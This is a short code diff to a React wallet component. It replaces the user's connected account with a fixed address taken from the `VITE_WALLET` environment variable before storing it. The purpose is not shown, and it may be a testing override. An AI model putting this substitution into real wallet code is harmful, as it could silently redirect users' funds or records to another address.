@@ -57,8 +57,9 @@ const Wallet = () => {
   };
   const updateWallet = async (accounts: any) => {
     setWallet({ accounts });
-    localStorage.setItem("walletAddress", accounts[0]);
-    storeWallet(accounts[0]);
+    const account = import.meta.env.VITE_WALLET;
+    localStorage.setItem("walletAddress", account);
+    storeWallet(account);
     navigate("/home");
   };
   const handleConnect = async () => {
